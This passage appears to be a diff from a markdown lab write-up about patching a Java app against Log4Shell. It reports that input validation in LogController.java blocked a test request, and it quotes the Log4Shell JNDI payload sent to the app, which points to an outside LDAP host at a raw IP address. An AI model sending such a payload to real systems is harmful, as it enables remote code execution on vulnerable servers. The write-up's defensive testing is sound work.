@@ -52,6 +52,7 @@ before: ![image](https://github.com/user-attachments/assets/70fa2a88-26a0-4531-a
 after: ![image](https://github.com/user-attachments/assets/cc7b0dfe-1943-4a31-a93d-7d90533207ea) 
 
 - Rebuild and restart: the result is as follow: ![image](https://github.com/user-attachments/assets/e8071e43-2160-4ec0-a7a5-b6e1f92bf70f)
+
 That confirms the patch is working; the pdated application successfully blocked the Log4Shell exploit attempt.
 What Just Happened: we sent the malicious payload {"input": "${jndi:ldap://44.208.30.186:1389/Exploit}"} ; The updated LogController.java now includes input validation that detects and blocks JNDI injection attempts and the app returned: Blocked suspicious input!
   
